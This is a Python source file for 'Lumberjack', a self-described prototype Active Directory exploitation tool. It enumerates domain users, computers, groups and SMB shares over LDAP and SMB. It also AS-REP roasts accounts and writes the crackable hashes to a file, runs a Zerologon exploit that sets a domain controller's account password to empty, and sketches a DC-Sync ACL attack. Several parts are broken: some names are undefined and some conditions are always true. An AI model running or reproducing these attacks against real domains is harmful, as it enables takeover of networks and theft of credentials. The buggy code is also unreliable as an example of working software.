#!/usr/bin/python3
# -*- coding: utf-8 -*-
try:
	#module imports
	import argparse, re, sys, textwrap, socket, random, threading, json

	#other imports
	from datetime import datetime, timedelta
	from pprint import pprint
	from ldap3 import Server, Connection, ALL, SUBTREE, ALL_ATTRIBUTES, ServerPool
	from ldap3.core.exceptions import LDAPBindError, LDAPException
	from time import sleep
	from getpass import getpass
	from rich.console import Console
	from termcolor import colored, cprint
	from rich.console import Theme
	from impacket.krb5 import constants
	from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
	from impacket.krb5.kerberosv5 import sendReceive, KerberosError
	from impacket.krb5.types import KerberosTime, Principal
	from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
	from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
	from impacket.dcerpc.v5 import nrpc, epm
	from impacket.smbconnection import SessionError
	from netaddr import *

	from impacket.nmb import NetBIOSTimeout, NetBIOSError	
	from impacket.dcerpc.v5 import transport
	from impacket import smbconnection
	from pyasn1.codec.der import decoder, encoder
	from pyasn1.type.univ import noValue
	from Cryptodome.Cipher import AES
	from dns.resolver import NXDOMAIN
	from pyfiglet import Figlet
	from binascii import hexlify, unhexlify
	from subprocess import check_call
except Exception as e:
    	print ("Error {}".format(e))

"""
lumberjack.py
"""

custom_theme = Theme({"success": "cyan", "error": "red", "warning": "yellow", "status": "green", "info": "purple"})
console = Console(theme=custom_theme)
LDAP_BASE_DN = 'DC=hacklabtest,DC=local'

# Give up brute-forcing after 2000 attempts.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

#Enumeration Class
class EnumerateAD(object):

	def __init__(self, domainController, ldaps, ldap, no_credentials, verbose, ip_address, connect, enumObj, fuzz, status, username, password):
		
		if domainController:
			self.dc = domainController
		else: 
			self.getDCName()
		
		if ip_address:
			self.dIP = ip_address
		else:
			self.getDC_IP(domainController)

		self.dUser = username
		self.dPassword = password
		self.ldaps = ldaps
		self.ldap = ldap
		self.noCreds = no_credentials
		self.status = status
		self.verbose = verbose
		self.fuzz = fuzz
		self.computers = []
		
	#check if the credentials have been entered
	def checks(self):
		if self.dUser is not False:
			self.connectCreds()
		else:
			self.dUser = ''
			self.dPassword = ''
			self.connectNoCreds()	
	
	#Connect to domain
	def connectCreds(self):
		self.status.update(status="[bold white]Connecting to Active Directory...")
		try:
			#Connect through LDAPS (Secure)
			if self.ldaps:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, port=646, use_ssl=True, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, user=self.dUser, password=self.dPassword, fast_decoder=True, auto_bind=True,
							auto_referrals=True, check_names=False, read_only=True, lazy=False, raise_exceptions=False)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAPs", style = "success")
			#Connect through LDAP
			elif self.ldap:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, self.dUser, password=self.dPassword, auto_bind=True, auto_referrals = False, fast_decoder=True)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAP", style = "success")			
			else:
				sleep(1)
				console.print ("[-] Error: Failed to connect: ", style = "error")
				raise LDAPBindError	
		except Exception as e:
			console.print ("[-] Error: Failed to connect: {} ".format(e), style = "error")
			raise LDAPBindError
	
	def connectNoCreds(self):
		self.status.update(status="[bold white]Connecting to Active Directory...")
		try:
			#Connect through LDAPS without Credentials
			if self.noCreds & self.ldaps:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, port=646, use_ssl=True, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, user=self.dUser, password=self.dPassword, fast_decoder=True, auto_bind=True,
							auto_referrals=True, check_names=False, read_only=True, lazy=False, raise_exceptions=False)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAPS and without credentials", style = "success")
			#Connect through LDAP without Credentials
			elif self.noCreds & self.ldap:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, get_info=ALL)
				self.conn = Connection(self.server_pool, auto_bind=True, auto_referrals = False, fast_decoder=True)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAP and without credentials", style = "success")            
			else :
				console.print ("[-] Error: Failed to connect: ", style = "error")
				raise LDAPBindError	
		except Exception as e:
			console.print ("[-] Error: Failed to connect: {} ".format(e), style = "error")
			raise LDAPBindError
		
	# Get the IP address of the domain controller		
	def getDC_IP(self, domainController):		

		try:
			ip_address = socket.gethostbyname(domainController)
			console.print("[+] Success: IP address of the domain is {}".format(ip_address))
		except:
			console.print("[-] Error: Unable to locate IP Address of Domain Controller through host lookup. Please try again", style = "error")            			
			sys.exit(1)

		self.dIP = ip_address
	
	# Get the IP address of the domain name		
	def getDCName(self):		
		try:
			domainController = socket.gethostname()
			console.print("[+] Success: Domain Name is {}".format(domainController))
		except:
			console.print("[-] Error: Unable to locate Domain Name through host lookup. Please try again", style = "error")            			
			sys.exit(1)

		self.dc = domainController
		
	#Enumerate Active Directory Users		
	def enumerateUsers(self):
		
		try:			
			self.status.update("[bold white]Finding Active Directory Users...")
			sleep(1)
			console.rule("[bold red]Domain Users")
			#Search AD Users (Verbose)
			if self.verbose:
				self.total_entries = 0
				self.entry_generator = self.conn.extend.standard.paged_search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=person)', size_limit=0)
				for entry in self.entry_generator:
				    self.total_entries += 1
				    pprint(entry)
				console.print ("[+] Success: Got all domain users ", style = "success")
				print('')
				console.print('[-] Found {0} user accounts'.format(len(self.total_entries)), style = "info")
			else:
				self.total_entries = 0
				self.entry_generator = self.conn.extend.standard.paged_search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=person)', size_limit=0)
				for entry in self.entry_generator:
				    self.total_entries += 1
				    pprint(entry)
				console.print("[+] Success: Got all domain users ", style = "success")
				print('')
				console.print("[-] Found {0} domain users".format((self.total_entries)), style = "info")
				print('')
				
		except LDAPException as e:
			console.print ("[-] Warning: No Users found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Computers?", style = "status")
			input("")
			EnumerateAD.enumComputers(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Active Directory Computers		
	def enumComputers(self):
		try:			
			self.status.update("[bold white]Finding Active Directory Computers...")
			sleep(1)
			console.rule("[bold red]Domain Computers")
			#Search AD Computers
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(objectCategory=computer)(objectClass=computer))', attributes=['dnshostname'], size_limit=0)
			for entry in self.conn.entries:
				pprint(self.conn.entries)	
				self.computers.append(entry)
				console.print ("[+] Success: Got all domain computers ", style = "success")
				print('')
				console.print('[-] Found {0} computers'.format(len(self.conn.entries)), style = "info")
				print('')
			
			enumSMBs = input("[-] Do you want to enumerate SMB shares [Y/n]")
			if enumSMBs == 'n' or 'N':
				EnumerateAD.enumerateGroups(self)
			elif enumSMBs == 'y' or 'Y':
				self.smbShareCandidates = []
				self.smbBrowseable = {}
				self.sortComputers()
				self.enumSMB()
					
		except LDAPException as e:
			console.print ("[-] Warning: No Computers found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		
	#Enumerate Active Directory Groups			
	def enumerateGroups(self):
		
		try:
			self.status.update("[bold white]Finding Active Directory Groups...")
			sleep(1)
			console.rule("[bold red]Domain Groups")
			#Search AD Group
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=group)', size_limit=0)
			pprint(self.conn.entries)
			console.print ("[+] Success: Got all groups ", style = "success")
			print('')
			console.print('[-] Found {0} groups'.format(len(self.conn.entries)), style = "info")
		except LDAPException as e:
			console.print ("[-] Warning: No Groups found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Organisational Units?", style = "status")
			input("")
			EnumerateAD.enumerateOUs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Organisational Units
	def enumerateOUs(self):
		
		try:
			self.status.update("[bold white]Finding Organisational Units...")
			sleep(1)
			console.rule("[bold red]Organisational Units")
			#Search AD Organisational Units
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectclass=organizationalUnit)', size_limit=0)
			pprint(self.conn.entries)
			console.print ("[+] Success: Got all OUs ", style = "success")
			print('')
			console.print('[-] Found {0} OUs'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:
			console.print ("[-] Warning: No OUs found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find ASREP Roastable Users?", style = "status")
			input("")
			EnumerateAD.enumKerbPreAuth(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)
			
	#Enumerate accounts trusted for delegation (unconstrained delegation)					
	def unconstrainedDelegation(self):
		
		try:	
			self.status.update("[bold white]Finding Users with unconstrained delegation...")
			sleep(1)
			console.rule("[bold red]Unconstrained Delegation")
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', size_limit=0)
			pprint(self.conn.entries)  
			console.print ("[+] Success", style = "success")
			print('')
			console.print('[-] Found {0} accounts with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
		try:
			console.print ("[-] Enumerate SPNs?", style = "status")
			input("")
			EnumerateAD.enumSPNs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)	
						
	#Enumerate SPNs
	def enumSPNs(self):
	
		try:	
			self.status.update("[bold white]Enumerating SPNs...")
			sleep(1)
			console.rule("[bold red]SPN Accounts")
			self.filter = "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
			self.conn.search(search_base=LDAP_BASE_DN, search_filter=self.filter, attributes=['userPrincipalName', 'servicePrincipalName'], size_limit=0)
			pprint(self.conn.entries)  
			console.print ("[+] Success: Got all OUs ", style = "success")
			print('')
			console.print('[-] Found {0} accounts with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
			print('')
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  
		try:
			console.print ("[-] Enumerate Password Last set?", style = "status")
			input("")
			EnumerateAD.passwdLastSet(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")

	def enumKerbPreAuth(self):
		self.status.update("[bold white]Finding Users that dont require Kerberos Pre-Authentication...")
		# Build user array
		users = []
		console.rule("[bold red]AS-REP Roastable Users")
		self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=ALL_ATTRIBUTES,search_scope=SUBTREE)
		for entry in self.conn.entries:
			users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.dc))
		pprint(self.conn.entries)
		console.print('[-] Found {0} accounts that dont require pre-authentication'.format(len(self.conn.entries)), style = "info")
		hashes = []
		self.status.update("[bold white]AS-REP Roasting...")
		# Build request for Tickets
		for usr in users:
			clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			asReq = AS_REQ()
			domain = str(self.dc).upper()
			serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			pacReq = KERB_PA_PAC_REQUEST()
			pacReq['include-pac'] = True
			encodedPacReq = encoder.encode(pacReq)
			asReq['pvno'] = 5
			asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
			asReq['padata'] = noValue
			asReq['padata'][0] = noValue
			asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
			asReq['padata'][0]['padata-value'] = encodedPacReq

			requestBody = seq_set(asReq, 'req-body')

			options = list()
			options.append(constants.KDCOptions.forwardable.value)
			options.append(constants.KDCOptions.renewable.value)
			options.append(constants.KDCOptions.proxiable.value)
			requestBody['kdc-options'] = constants.encodeFlags(options)

			seq_set(requestBody, 'sname', serverName.components_to_asn1)
			seq_set(requestBody, 'cname', clientName.components_to_asn1)

			requestBody['realm'] = domain

			now = datetime.utcnow() + timedelta(days=1)
			requestBody['till'] = KerberosTime.to_asn1(now)
			requestBody['rtime'] = KerberosTime.to_asn1(now)
			requestBody['nonce'] = random.getrandbits(31)

			supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

			seq_set_iter(requestBody, 'etype', supportedCiphers)

			msg = encoder.encode(asReq)

			try:
				response = sendReceive(msg, domain, self.dc)
			except KerberosError as e:
				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
					seq_set_iter(requestBody, 'etype', supportedCiphers)
					msg = encoder.encode(asReq)
					response = sendReceive(msg, domain, self.dc)	
			else:
		            pprint(e)
		            continue

			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

			if len(hashes) > 0:
				pprint(hashes)
				with open('{0}-jtr-hashes'.format(self.dc), 'w') as f:
					for h in hashes:
						f.write(str(h) + '\n')
						console.print('[-] Wrote all hashes to {0}-jtr-hashes'.format(len(self.dc)), style = "info")
			else:
				console.print('[-] Warning: Got 0 hashes', style = "warning")	
				
	#Fuzz AD with ANR (Ambiguous Name Resolution)
	def searchRandom(self, fobject, objectCategory=''):
		self.status.update("[bold white]Fuzzing Active Directory for: '{}'".format(fobject))
		#console.print('[-] Found {0} user accounts'.format(len(self.conn.entries)), style = "info")
		sleep(1)
		if objectCategory:
			searchFilter = '(&(objectCategory={})(anr={}))'.format(objectCategory, fobject)
		else:
			searchFilter = '(anr={})'.format(fobject)
		try:	
			self.conn.search(search_base=LDAP_BASE_DN, search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} objects'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries) 
		except LDAPException as e:   
			console.print ("[-] Warning Nothing found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  

	def sortComputers(self):
		for computer in self.computers:
		    try:
		        self.smbShareCandidates.append(computer['dNSHostName'])
		    except LDAPKeyError:
		        # No dnsname registered
		        continue
		if len(self.smbShareCandidates) == 1:
			console.print("[+] Found {0} dnsname".format(len(self.smbShareCandidates)), style="info")
		else:
			console.print("[+] Found {0} dnsname".format(len(self.smbShareCandidates)), style="info")

	def enumSMB(self):
	      
		try:
			for dnsname in self.smbShareCandidates:
				try:
					# Changing default timeout as shares should respond withing 5 seconds if there is a share
					# and ACLs make it available to self.user with self.passwd
					smbconn = smbconnection.SMBConnection('\\\\' + str(dnsname), str(dnsname), timeout=5)
					smbconn.login(self.dUser, self.dPassword)
					dirs = smbconn.listShares()
					self.smbBrowseable[str(dnsname)] = {}
					for share in dirs:
						self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
						try:
							_ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
							self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
						except (SessionError, UnicodeEncodeError, NetBIOSError):
							continue
					smbconn.logoff()
				except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
				    continue
		except ValueError:
		    	pass
		print('')
		availDirs = []
		for key, value in self.smbBrowseable.items():
		    for _, v in value.items():
		        if v:
		            availDirs.append(key)

		if len(self.smbShareCandidates) == 1:
			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}".format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
		else:
			console.print("[+] Searched {0} share and {1} with {2} subdirectories/files is browsable by {3}".format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.dUser), style = "info")
		if len(self.smbBrowseable.keys()) > 0:
		    with open('{0}-open-smb.json'.format(self.dc), 'w') as f:
		        json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
		    print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.dc))


class zeroLogon(object):
	
	def err(msg):
		cprint("[!] " + msg, "red")

	def try_zero_authenticate(dc_handle, dc_ip, target_computer):
		# Connect to the DC's Netlogon service.
		binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
		rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
		rpc_con.connect()
		rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

		# Use an all-zero challenge and credential.
		plaintext = b"\x00" * 8
		ciphertext = b"\x00" * 8

		# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
		flags = 0x212fffff

		# Send challenge and authentication request.
		nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
		try:
			server_auth = nrpc.hNetrServerAuthenticate3(
				rpc_con, dc_handle + "\x00", target_computer + "$\x00",
				nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
						target_computer + "\x00", ciphertext, flags
			)

			# It worked!
			assert server_auth["ErrorCode"] == 0
			return rpc_con

		except nrpc.DCERPCSessionError as ex:
			# Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
			if ex.get_error_code() == 0xc0000022:
				return None
			else:
				err("Unexpected error code returned from DC: {}".format(ex.get_error_code()))
		except BaseException as ex:
			err("Unexpected error: {}".format(ex))

	def try_zerologon(dc_handle, rpc_con, target_computer):
		"""
		Authenticator: A NETLOGON_AUTHENTICATOR structure, as specified in section 2.2.1.1.5, that contains the encrypted
		logon credential and a time stamp.
			typedef struct _NETLOGON_AUTHENTICATOR {
			NETLOGON_CREDENTIAL Credential;
			DWORD Timestamp;
			}
		Timestamp:  An integer value that contains the time of day at which the client constructed this authentication
		credential, represented as the number of elapsed seconds since 00:00:00 of January 1, 1970.
		The authenticator is constructed just before making a call to a method that requires its usage.
			typedef struct _NETLOGON_CREDENTIAL {
				CHAR data[8];
			}
		ClearNewPassword: A NL_TRUST_PASSWORD structure, as specified in section 2.2.1.3.7,
		that contains the new password encrypted as specified in Calling NetrServerPasswordSet2 (section 3.4.5.2.5).
			typedef struct _NL_TRUST_PASSWORD {
				WCHAR Buffer[256];
				ULONG Length;
			}
		ReturnAuthenticator: A NETLOGON_AUTHENTICATOR structure, as specified in section 2.2.1.1.5,
		that contains the server return authenticator.
		More info can be found on the [MS-NRPC]-170915.pdf
		"""
		request = nrpc.NetrServerPasswordSet2()
		request["PrimaryName"] = dc_handle + "\x00"
		request["AccountName"] = target_computer + "$\x00"
		request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
		authenticator = nrpc.NETLOGON_AUTHENTICATOR()
		authenticator["Credential"] = b"\x00" * 8
		authenticator["Timestamp"] = 0
		request["Authenticator"] = authenticator
		request["ComputerName"] = target_computer + "\x00"
		request["ClearNewPassword"] = b"\x00" * 516
		return rpc_con.request(request)

	def perform_attack(dc_handle, dc_ip, target_computer):
		banner = pyfiglet.figlet_format("Zerologon", "slant")
		cprint(banner, "green")
		cprint("Checker & Exploit by VoidSec\n", "white")
		# Keep authenticating until successful. Expected average number of attempts needed: 256.
		cprint("Performing authentication attempts...", "white")
		rpc_con = None
		for attempt in range(0, MAX_ATTEMPTS):
			rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

			if rpc_con is None:
				cprint(".", "magenta", end="", flush=True)
			else:
				break

		if rpc_con:
			cprint("\n[+] Success: Target is vulnerable!", "green")
			cprint("[-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y", "yellow")
			exec_exploit = input().lower()
			if exec_exploit == "y":
				result = try_zerologon(dc_handle, rpc_con, target_computer)
				if result["ErrorCode"] == 0:
					cprint(
						"[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.",
						"green")
				else:
					err(
						"Exploit Failed: Non-zero return code, something went wrong. Domain Controller returned: {}".format(
							result["ErrorCode"]))
			else:
				err("Aborted")
				sys.exit(0)
		else:
			err("Exploit failed: target DC is probably patched.")
			sys.exit(1)

def dcSync(domain, username):

	c = NTLMRelayxConfig()
	c.addcomputer = 'idk lol'
	c.target = domain
	enumAD = EnumerateAD()

	console.print ("[-] Starting DC-Sync Attack on {}".format(username), style="status")
	console.print ("[-] Initialising LDAP connection to {}".format(domain), style="status")

	console.print ("[-] Initialising domainDumper()", style="status")
	cnf = ldapdomaindump.domainDumpConfig()
	cnf.basepath = c.lootdir
	dd = ldapdomaindump.domainDumper(enumAD.server, enumAD.conn, cnf)
	
	console.print ("[-] Initializing LDAPAttack()", style="status")

	la = LDAPAttack(c, enumAD.conn)
	la.aclAttack(username, dd)

def titleArt():
	f = Figlet(font="slant")
	cprint(colored(f.renderText('Lumberjack'), 'cyan'))

def main():

	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
				 __                    __              _            __
				/ /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
		       / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
		      / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
		     /_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
												/___/
	                       __.                                   By Tom Gardner
	              ________/o |)
	             {_______{_rs|
	        
       A Prototype Active Directory Vulnerability Identification, Exploitation, & Reporting Tool
    |*------------------------------------------------------------------------------------------*|
   	 '''))

	#Required arguments
	parser.add_argument('-dc', type=str, help='Hostname of the Domain Controller')
	parser.add_argument('-ls', '--ldaps', help='Connect to domain through LDAPS (Secure)', action='store_true')
	parser.add_argument('-l', '--ldap', help='Connect to domain through LDAP', action='store_true')
	parser.add_argument('-u', '--username', type=str, help='Username of domain user. The username format must be `user@domain.org`')
	parser.add_argument('-p', '--password', type=str, help='User Password`')
	parser.add_argument('-nc', '--no_credentials', help='Run without credentials', action='store_true')
	parser.add_argument('-h', '--help', help='show this help message and exit', action='help')
	parser.add_argument('-ip', '--ip_address', type=str, help='ip address of Active Directory')
	parser.add_argument('-en', '--enumerate', help='Enumerate Active Directory Objects', action='store_true')
	parser.add_argument('-c', '--connect', help='Just connect and nothing else', action='store_true')
	parser.add_argument('-n', '--netbios', type=str, help='NetBIOS name of Domain Controller')
	parser.add_argument('-v', '--verbose', action='store_true')
	parser.add_argument('-e', '--exploit', help='run exploit features: 1 = DC-Sync, 2 = zerologon')
	parser.add_argument('identity' , action='store_true', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')

	parser.add_argument('-f', '--fuzz', type=str)
	args = parser.parse_args()
	
	#Display help page if no arguments are provided
	if len(sys.argv) < 2:
		console.print("[-] Warning: No Arguments Provided", style = "warning")
		parser.print_help()
		parser.exit(1)

	if args.no_credentials:
		args.username = False
		args.password = False
	
	password = args.password
	
	if not password and not args.no_credentials:
		status.update("[bold white]Waiting...")
		print("Enter a password:")
		password = getpass()
	
	if args.connect:
		args.enumerate = False
		args.fuzz = False	
	elif args.enumerate:
		args.fuzz = False
	elif args.fuzz:
		args.enumerate = False
		
	# Regex for invalid domain name or invalid ip address format
	domainRE = re.compile(r'^((?:[a-zA-Z0-9-.]+)?(?:[a-zA-Z0-9-.]+)?[a-zA-Z0-9-]+\.[a-zA-Z]+)$')
	domainMatch = domainRE.findall(args.dc)

	ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
	ipaddr = ipRE.findall(args.ip_address)
	
	#if invalid domain name and ip address format
	if not domainMatch:
		console.print("[-] Error: {} is not a valid domain name'".format(args.dc), style = "error")
		sys.exit(1)
	if not ipaddr:
		console.print("[-] Error: {} is not a valid IP Address'".format(args.ip_address), style = "error")
		sys.exit(1)
		
	titleArt()
	console.print("[+] Success: Lumberjack Started", style="success")	
	start_time = datetime.now()
	
	#Run main features
	try:
		enumAD = EnumerateAD(args.dc, args.ldaps, args.ldap, args.no_credentials, args.verbose, args.ip_address, args.connect, args.enumerate, args.fuzz, status, args.username, password)
		#zeroLogon = zerologonExploit(args.netbios, args.ip_address, status)
		enumAD.checks()
		if args.enumerate is not False:
			status.update("[bold white]Waiting...")
			console.print ("[-] Enumerate Users?", style = "status")
			input("")
			enumAD.enumerateUsers()
		elif args.fuzz is not False:
			enumAD.searchRandom(args.fuzz)
		elif args.exploit == "1":
			dcSync(args.dc, args.username)
	except RuntimeError as e:
		pprint ("Error {}".format(e))
	except KeyboardInterrupt:
		console.print ("[-] Warning: Aborting", style = "warning")
		
	status.update("[bold white]Exiting Lumberjack...")
	sleep(1)
	elapsed = datetime.now() - start_time
	console.print(f"[+] Completed after {elapsed.total_seconds():.2f} seconds", style="warning")
	
	#print blank line
	pprint('')
	
if __name__ == "__main__":
	with console.status("[bold white]Starting Lumberjack...") as status:
		try:
			sleep(1)
			main()
			console.print("[+] Success: Finished", style="success")	
		except KeyboardInterrupt:
			console.print ("[-] Warning: Aborted", style= "warning")
